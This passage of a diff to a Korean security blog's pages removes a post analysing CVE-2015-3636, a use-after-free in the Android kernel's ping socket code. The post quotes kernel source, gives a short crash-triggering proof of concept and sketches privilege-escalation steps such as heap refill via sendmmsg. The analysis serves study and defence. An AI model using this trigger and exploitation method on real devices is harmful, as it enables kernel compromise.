-</span><span class='line'>        <span class="n">write_lock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">hlist_nulls_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_nulls_node</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>        <span class="n">sock_prot_inuse_add</span><span class="p">(</span><span class="n">sock_net</span><span class="p">(</span><span class="n">sk</span><span class="p">),</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">write_unlock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 를 하면, <code>__hlist_nulls_del(n)</code> 으로 지우고, <code>n-&gt;pprev = LIST_POISON2</code> 가 된다.</p>
-
-<figure class='code'><figcaption><span>hlist_nulls_del(struct hlist_nulls_node *n)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">next</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_ndoe</span> <span class="o">**</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">;</span>
-</span><span class='line'>    <span class="o">*</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_a_nulls</span><span class="p">(</span><span class="n">next</span><span class="p">))</span>
-</span><span class='line'>        <span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">pprev</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="n">__hlist_nulls_del</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">LIST_POISON2</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>n-&gt;pprev = LIST_POISON2</code> 라는 코드가 있는데, <code>LIST_POISON2</code> 의 값은 Android 32/64 bit kernel 에서 모두 <code>0x200200</code> 이다.</p>
-
-<p>저자에 따르면,</p>
-
-<ul>
-<li>connect 를 두번째 부를때, <code>ping_unhash()</code> 가 또 불리고, 리스트에서 지워지기는 했지만, <code>sk_hashed(sk)</code> 체크는 통과해서 다시 <code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 가 또 불린다.</li>
-<li><code>n-&gt;pprev</code> 는 전번의 콜 <code>n-&gt;pprev = LIST_POISON2</code> 에 의해서 LIST_POISON2 인 상황인데, <code>**pprev = n-&gt;pprev;</code> -> <code>*pprev = next;</code> 가 돌아가면 <code>0x200200</code> 에 write 가 들어간다.</li>
-<li>0x200200 이 page mapping 이 안되어 있으면, kernel 에서 fault 가 난다.</li>
-</ul>
-
-
-<p>여기서 local DoS 가 발생하는데, 저자에 따르면 local DoS 는 전체 그림의 일부분이라는 것.</p>
-
-<p><code>ping_unhash()</code> 에서, <code>sk_hashed()</code> 체크 이후에, 리스트에서 지우고, <code>sock_put()</code> 을 부르는데, 저자들은 이게 수상쩍다고 한다.
-<code>sock_put()</code> 를 보면, <code>sk_refcnt</code> 를 줄이고, 0 이면 sk_free() 를 통해서 free 가 들어간다.</p>
-
-<figure class='code'><figcaption><span>sock_put()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">sock_put</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">))</span>
-</span><span class='line'>        <span class="n">sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>일단 0x200200 을 mapping 해놔서 paging fault 를 막아낸 다음에,</li>
-<li><code>sock_put()</code> 을 두번 불러서 <code>sk_free()</code> 가 불려지도록 하고,</li>
-<li>그 다음에 거기를 어떻게든 re-fill 해놓고</li>
-<li>close() 콜로 close 관련 function ptr 을 호출하는</li>
-<li>Use-after-refill-after-free 상황을 만들어내는게 저자의 의도같다.</li>
-</ul>
-
-
-<p>Use-after-free 를 설명하면,</p>
-
-<ul>
-<li>일단 free 를 시켜야한다. allocator 가 잡고 있는 메모리에 뭘 쓰는건 어렵다.</li>
-<li>근데 비정상적으로 free 시키는 것이 좋다. 정상적으로 free 시키면 진짜 없는 녀석이 되기 때문에, 나중에 사용이 불가능하다.</li>
-<li>비정상적으로 free 시키고, 그 자리에 어떻게든 다른 object 를 allocate 시켜야한다.</li>
-<li>다른 object 를 allocate 시킨 다음에, 그 내용을 어느정도 조작할 수 있어야한다.</li>
-<li>원래 object 의 function ptr 가 위치했던 자리를 조작해낼 수 있으면 대박이다.</li>
-<li>조작해낸 다음에 원래 object 의 close() 를 부르면 close function ptr 가 호출되고&hellip; 이러면 대박이다.</li>
-</ul>
-
-
-<p>저자들은 여기서 refilling 이 핵심이라고 이야기한다.</p>
-
-<h4>PoC</h4>
-
-<p>CVE-2015-3636 의 PoC.</p>
-
-<figure class='code'><figcaption><span>PoC of CVE-2015-3636</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">IPPROTO_ICMP</span><span class="p">);</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_INET</span> <span class="p">};</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">_addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span> <span class="p">};</span>
-</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
-</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이렇게 하면 crash 가 날것 같은데.</p>
-
-<ul>
-<li>처음에는 AF_INET 으로 해야한다고 한다.</li>
-<li>Android 디바이스에서만 동작한다고 한다. <code>/proc/sys/net/ipv4/ping_group_range</code> 에 PING socket 을 만들 수 있는 그룹이 정의되어 있다고. PC 리눅스와 Android 와는 이 부분이 다르다고.</li>
-</ul>
-
-
-<p>QEMU 에 android kernel 을 올려서, 저 코드를 실행을 해봐야겠다.</p>
-
-<h4>Exploitation</h4>
-
-<p>Kernel 에서 SLAB/SLUB allocator 를 사용한다고 하는데.</p>
-
-<p>고려해야할 점은.</p>
-
-<ul>
-<li>Isolated Heap. PartitionAlloc. 이런 메커니즘들.</li>
-<li>Privileged Access Never.</li>
-<li>Linux kernel 의 multi-threading support.</li>
-</ul>
-
-
-<p>둘간의 차이는 여기에 <a href="http://events.linuxfoundation.org/images/stories/pdf/klf2012_kim.pdf">SLAB vs SLUB</a></p>
-
-<p>이 쯤에서 저자들이 이 버그를 어떻게 찾아냈는지 추측해본다.</p>
-
-<ul>
-<li>Trinity 로 android kernel call fuzzing 을 심하게 걸었는데</li>
-<li>0x200200 에 write 가 들어가면서 paging fault 가 나는 것을 보고 조사를 해보니,</li>
-<li>PING socket 에 대한 connect 가 두번 불려서 일어난 것이라는 걸 알아내고</li>
-<li>아니, 시스템 콜 이중호출로 paging fault 가 일어나는 걸 보니, 수상한걸&hellip;</li>
-<li>아니, 이중호출로 object 가 free() 가 되네.</li>
-<li>이거 use-after-free 아녀?</li>
-<li>free() 한 다음에 refill 이 가능할까?</li>
-</ul>
-
-
-<p>뭐 이렇게 흘러간것 같다.</p>
-
-<ul>
-<li>socket structure 를 삐꾸로 free() 하고,</li>
-<li>memory allocator 를 어찌어찌 이용해서, 그 자리에 뭔가 object 를 alloc 시켜서 refill 을 한 다음에,</li>
-<li>(socket 이 정상이라고 착각하고 있는 상황에서) socket close() 를 불러서, close_func_ptr 이 호출되게 만드는데,</li>
-<li>그 포인터는 exploit 을 향하고 있다.</li>
-</ul>
-
-
-<p>이 정도가 아닐까?</p>
-
-<h4>Refill</h4>
-
-<p>저자들은 refill 이 가장 어려웠다고 한다.</p>
-
-<ul>
-<li><code>sendmmsg()</code> 를 가지고 refill 을 한 모양.</li>
-<li><code>sendmmsg()</code> 수행중에 <code>kmalloc</code> 이 들어가서 파라메터로 넘겨준 데이터 패킷을 저장하기 위한 버퍼를 alloc 한다고.</li>
-<li>데이터패킷의 사이즈를 지정할 수 있는데, 512 로 해서, PING socket 과 같은 cache 에 alloc 되도록 한다.</li>
-</ul>
-
-
-<p>즉 흐름을 정리하면 <code>(512 bytes) PING SOCK</code> -> bug free -> <code>(512 bytes) FREE chunk</code> -> sendmmsg -> <code>(512 bytes) TRANSFER BUFFER</code> 가 되는 셈.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/4">&larr; Older</a>
@@ -1739,23 +611,23 @@ BoxType 은 4 글자 코드로 구성된다. FourCC 라고 불리는데, <code>c
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/">PlaidCTF CTF 2015: PlaidDB</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">Hitcon Ctf 2014 Unexploitable Heap Overflow</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
   </ul>
